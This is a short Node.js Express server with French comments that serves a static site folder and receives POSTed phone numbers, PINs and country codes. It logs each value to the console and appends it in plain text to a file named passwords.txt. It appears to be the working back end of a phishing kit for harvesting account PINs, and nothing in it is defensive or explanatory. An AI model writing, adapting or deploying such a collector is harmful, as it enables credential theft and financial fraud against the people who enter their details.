const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 10000;


// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); // indispensable pour fetch JSON

// Dossier statique
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Fichier où les données seront sauvegardées
const FILE = path.join(__dirname, "passwords.txt");

// Route POST pour recevoir phone, pin et country
app.post("/", (req, res) => {
    const { phone, pin, country } = req.body; // ajout de country

     // 🔍 Logs sur Render
    console.log("REQ BODY :", req.body);
    console.log("COUNTRY :", country);
    console.log("PHONE   :", phone);
    console.log("PIN     :", pin);

    if (!phone || !pin || !country) {
        console.log("❌ Données manquantes");
        return res.sendStatus(400);
    }
     // Sauvegarde dans le fichier
    const line = `COUNTRY: ${country} | PHONE: ${phone} | PIN: ${pin}\n`;
    fs.appendFileSync(FILE, line);

    // Réponse simple
    res.sendStatus(200);
});

// Lancement du serveur
app.listen(PORT, () => {
  console.log("Serveur online sur port " + PORT);});